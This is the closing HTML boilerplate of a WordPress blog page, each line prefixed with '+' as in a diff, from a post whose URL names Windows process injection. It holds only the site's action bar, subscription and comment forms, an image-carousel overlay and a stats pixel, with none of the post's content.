+							<a class="actnbr-action actnbr-actn-reblog" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" role="button">
+								<svg class="actnbr-icon actnbr-icon-reusable-block" width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" fill="currentColor"><path d="M7 7.2h8.2L13.5 9l1.1 1.1 3.6-3.6-3.5-4-1.1 1 1.9 2.3H7c-.9 0-1.7.3-2.3.9-1.4 1.5-1.4 4.2-1.4 5.6v.2h1.5v-.3c0-1.1 0-3.5 1-4.5.3-.3.7-.5 1.2-.5zm13.8 4V11h-1.5v.3c0 1.1 0 3.5-1 4.5-.3.3-.7.5-1.3.5H8.8l1.7-1.7-1.1-1.1L5.9 17l3.5 4 1.1-1-1.9-2.3H17c.9 0 1.7-.3 2.3-.9 1.5-1.4 1.5-4.2 1.5-5.6z"></path></svg><span>Reblog</span>
+							</a>
+						</li>
+											<li class="actnbr-btn actnbr-hidden">
+										<a class="actnbr-action actnbr-actn-follow " href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" role="button" aria-haspopup="dialog" aria-expanded="false">
+				<svg class="actnbr-icon actnbr-icon-bell" width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M17 11.5c0 1.353.17 2.368.976 3 .266.209.602.376 1.024.5v1H5v-1c.422-.124.757-.291 1.024-.5.806-.632.976-1.647.976-3V9c0-2.8 2.2-5 5-5s5 2.2 5 5v2.5ZM15.5 9v2.5c0 .93.066 1.98.515 2.897l.053.103H7.932a4.018 4.018 0 0 0 .053-.103c.449-.917.515-1.967.515-2.897V9c0-1.972 1.528-3.5 3.5-3.5s3.5 1.528 3.5 3.5Zm-5.492 9.008c0-.176.023-.346.065-.508h3.854A1.996 1.996 0 0 1 12 20c-1.1 0-1.992-.892-1.992-1.992Z"></path></svg>				<span>Subscribe</span>
+			</a>
+			<a class="actnbr-action actnbr-actn-following  no-display" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" role="button">
+				<svg class="actnbr-icon actnbr-icon-check" width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" style="fill: none" stroke="currentColor" stroke-width="1.5"><path d="M7 12L10 15L17 8" vector-effect="non-scaling-stroke"></path></svg>				<span>Subscribed</span>
+			</a>
+									<div class="actnbr-popover actnbr-panel actnbr-notice" id="follow-bubble" role="dialog" aria-label="Subscribe to modexp">
+								<div class="actnbr-follow-bubble">
+								<div class="actnbr-panel__group"><a class="actnbr-menu__item actnbr-sitename" href="https://modexp.wordpress.com/"><img loading="lazy" alt="" src="https://modexp.wordpress.com/wp-content/uploads/2018/08/cropped-debug.png?w=50" class="avatar avatar-50" height="50" width="50"><span class="actnbr-menu__label">modexp</span></a></div>																	<div class="actnbr-panel__group">
+										<div class="actnbr-message no-display" aria-live="polite"></div>
+										<form method="post" action="https://subscribe.wordpress.com/" accept-charset="utf-8" class="no-display">
+																							<div class="actnbr-follow-count">Join 58 other subscribers</div>
+																							<input type="email" name="email" placeholder="Want updates? Enter your email" class="actnbr-email-field" aria-label="Email address">
+											
+											
+											
+											
+																						<button type="submit" class="actnbr-button">Sign me up</button>
+										</form>
+										<p class="actnbr-login-nudge">
+											Have a WordPress.com account? <a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fmodexp.wordpress.com%2F2019%2F08%2F09%2Fwindows-process-injection-breaking-badder%2F&amp;signup_flow=account">Log in now.</a>										</p>
+									</div>
+																	</div>
+							</div>
+						</li>
+									<li class="actnbr-ellipsis actnbr-hidden">
+					<button type="button" class="actnbr-more-toggle" aria-haspopup="true" aria-expanded="false" aria-label="More options">
+						<svg class="actnbr-icon actnbr-icon-more-horizontal" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" fill="currentColor"><path d="M11 13h2v-2h-2v2zm-6 0h2v-2H5v2zm12-2v2h2v-2h-2z"></path></svg>					</button>
+					<div class="actnbr-popover actnbr-menu" role="menu" aria-label="Site options">
+						<div class="actnbr-menu__group" role="group"><a role="menuitem" class="actnbr-menu__item actnbr-sitename" href="https://modexp.wordpress.com/"><img loading="lazy" alt="" src="https://modexp.wordpress.com/wp-content/uploads/2018/08/cropped-debug.png?w=50" class="avatar avatar-50" height="50" width="50"><span class="actnbr-menu__label">modexp</span></a></div><div class="actnbr-menu__group" role="group"><a role="menuitem" class="actnbr-menu__item actnbr-shortlink" href="https://wp.me/p7ABSW-18b"><span class="actnbr-menu__label actnbr-shortlink__text">Copy shortlink</span><span class="actnbr-menu__icon actnbr-shortlink__icon"><svg class="actnbr-icon actnbr-icon-copy" width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M5 4.5h11a.5.5 0 0 1 .5.5v11a.5.5 0 0 1-.5.5H5a.5.5 0 0 1-.5-.5V5a.5.5 0 0 1 .5-.5ZM3 5a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5Zm17 3v10.75c0 .69-.56 1.25-1.25 1.25H6v1.5h12.75a2.75 2.75 0 0 0 2.75-2.75V8H20Z"></path></svg></span><span class="actnbr-menu__icon actnbr-shortlink__icon-copied"><svg class="actnbr-icon actnbr-icon-check" width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" style="fill: none" stroke="currentColor" stroke-width="1.5"><path d="M7 12L10 15L17 8" vector-effect="non-scaling-stroke"></path></svg></span></a><a role="menuitem" class="actnbr-menu__item actnbr-reader" href="https://wordpress.com/reader/blogs/112159794/posts/4351"><span class="actnbr-menu__label">View post in Reader</span></a></div><div class="actnbr-menu__group" role="group"><a role="menuitem" class="actnbr-menu__item actnbr-subs" href="https://subscribe.wordpress.com/"><span class="actnbr-menu__label">Manage subscriptions</span></a><a role="menuitem" class="actnbr-menu__item actnbr-signup" href="https://wordpress.com/start/"><span class="actnbr-menu__label">Sign up</span></a><a role="menuitem" class="actnbr-menu__item actnbr-login" href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fmodexp.wordpress.com%2F2019%2F08%2F09%2Fwindows-process-injection-breaking-badder%2F&amp;signup_flow=account"><span class="actnbr-menu__label">Log in</span></a></div><div class="actnbr-menu__group" role="group"><a role="menuitem" class="actnbr-menu__item flb-report" href="https://wordpress.com/abuse/?report_url=https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" target="_blank" rel="noopener noreferrer"><span class="actnbr-menu__label">Report this content</span><span class="actnbr-menu__icon"><svg class="actnbr-icon actnbr-icon-external" width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" fill="currentColor"><path d="M19.5 4.5h-7V6h4.44l-5.97 5.97 1.06 1.06L18 7.06v4.44h1.5v-7Zm-13 1a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-3H17v3a.5.5 0 0 1-.5.5h-10a.5.5 0 0 1-.5-.5v-10a.5.5 0 0 1 .5-.5h3V5.5h-3Z"></path></svg></span></a></div><div class="actnbr-menu__group" role="group"><a role="menuitem" class="actnbr-menu__item actnbr-fold" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/"><span class="actnbr-menu__label">Collapse this bar</span></a></div>					</div>
+				</li>
+			</ul>
+		</div>
+		
+<link rel="prefetch" href="https://modexp.wordpress.com/wp-content/mu-plugins/jetpack-plugin/sun/_inc/blocks/swiper.js" as="script">
+		<div id="jp-carousel-loading-overlay" style="display: none;">
+			<div id="jp-carousel-loading-wrapper">
+				<span id="jp-carousel-library-loading"><svg class="jetpack-spinner" width="40" height="40" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><circle cx="50" cy="50" r="46" fill="none" stroke="#ddd" stroke-width="8"></circle><path d="M 50 4 A 46 46 0 0 1 96 50" fill="none" stroke="currentColor" stroke-width="8" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" dur="1.4s" from="0 50 50" to="360 50 50" repeatCount="indefinite"></animateTransform></path></svg></span>
+			</div>
+		</div>
+		<div class="jp-carousel-overlay" style="display: none;">
+
+		<div class="jp-carousel-container">
+			<!-- The Carousel Swiper -->
+			<div class="jp-carousel-wrap swiper jp-carousel-swiper-container jp-carousel-transitions" itemscope="" itemtype="https://schema.org/ImageGallery">
+				<div class="jp-carousel swiper-wrapper"></div>
+				<div class="jp-swiper-button-prev swiper-button-prev">
+					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
+							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"></path>
+						</mask>
+						<g mask="url(#maskPrev)">
+							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"></rect>
+						</g>
+					</svg>
+				</div>
+				<div class="jp-swiper-button-next swiper-button-next">
+					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
+							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"></path>
+						</mask>
+						<g mask="url(#maskNext)">
+							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"></rect>
+						</g>
+					</svg>
+				</div>
+			</div>
+			<!-- The main close buton -->
+			<div class="jp-carousel-close-hint">
+				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
+						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"></path>
+					</mask>
+					<g mask="url(#maskClose)">
+						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"></rect>
+					</g>
+				</svg>
+			</div>
+			<!-- Image info, comments and meta -->
+			<div class="jp-carousel-info">
+				<div class="jp-carousel-info-footer">
+					<div class="jp-carousel-pagination-container">
+						<div class="jp-swiper-pagination swiper-pagination"></div>
+						<div class="jp-carousel-pagination"></div>
+					</div>
+					<div class="jp-carousel-photo-title-container">
+						<div class="jp-carousel-photo-caption"></div>
+					</div>
+					<div class="jp-carousel-photo-icons-container">
+						<a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
+							<span class="jp-carousel-icon">
+								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
+										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"></path>
+									</mask>
+									<g mask="url(#maskInfo)">
+										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"></rect>
+									</g>
+								</svg>
+							</span>
+						</a>
+												<a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
+							<span class="jp-carousel-icon">
+								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
+										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"></path>
+									</mask>
+									<g mask="url(#maskComments)">
+										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"></rect>
+									</g>
+								</svg>
+
+								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
+							</span>
+						</a>
+											</div>
+				</div>
+				<div class="jp-carousel-info-extra">
+					<div class="jp-carousel-info-content-wrapper">
+						<div class="jp-carousel-photo-title-container">
+							<div class="jp-carousel-photo-title"></div>
+						</div>
+						<div class="jp-carousel-comments-wrapper">
+															<div id="jp-carousel-comments-loading">
+									<span>Loading Comments...</span>
+								</div>
+								<div class="jp-carousel-comments"></div>
+								<div id="jp-carousel-comment-form-container">
+									<span id="jp-carousel-comment-form-spinner"><svg class="jetpack-spinner" width="20" height="20" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><circle cx="50" cy="50" r="46" fill="none" stroke="#ddd" stroke-width="8"></circle><path d="M 50 4 A 46 46 0 0 1 96 50" fill="none" stroke="currentColor" stroke-width="8" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" dur="1.4s" from="0 50 50" to="360 50 50" repeatCount="indefinite"></animateTransform></path></svg></span>
+									<div id="jp-carousel-comment-post-results"></div>
+																														<form id="jp-carousel-comment-form">
+												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
+												<textarea name="comment" class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea" id="jp-carousel-comment-form-comment-field" placeholder="Write a Comment..."></textarea>
+												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
+													<div id="jp-carousel-comment-form-commenting-as">
+																													<fieldset>
+																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
+																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field">
+															</fieldset>
+															<fieldset>
+																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
+																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field">
+															</fieldset>
+															<fieldset>
+																<label for="jp-carousel-comment-form-url-field">Website</label>
+																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field">
+															</fieldset>
+																											</div>
+													<input type="submit" name="submit" class="jp-carousel-comment-form-button" id="jp-carousel-comment-form-button-submit" value="Post Comment">
+												</div>
+											</form>
+																											</div>
+													</div>
+						<div class="jp-carousel-image-meta">
+							<div class="jp-carousel-title-and-caption">
+								<div class="jp-carousel-photo-info">
+									<div class="jp-carousel-caption" itemprop="caption description"></div>
+								</div>
+
+								<div class="jp-carousel-photo-description"></div>
+							</div>
+							<a class="jp-carousel-image-download" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#" aria-label="Download image" target="_blank" style="display: none;">
+								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
+										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"></path>
+									</mask>
+									<g mask="url(#mask0)">
+										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"></rect>
+									</g>
+								</svg>
+								<span class="jp-carousel-download-text"></span>
+							</a>
+							<div class="jp-carousel-image-map" style="display: none;"></div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		</div>
+		
+	
+				
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<div src="https://widgets.wp.com/likes/master.html?ver=20260930#ver=20260930" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">
+
+
+
+
+
+
+</div></div>
+	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+	 
+
+
+		 	
+
+
+
+<img src="https://pixel.wp.com/g.gif?blog=112159794&amp;v=wpcom&amp;tz=0&amp;user_id=0&amp;post=4351&amp;subd=modexp&amp;host=modexp.wordpress.com&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;rand=0.722353066337518" alt="" id="wpstats"><div class="comment-likes-overlay" style="display: none;"></div></body></html>
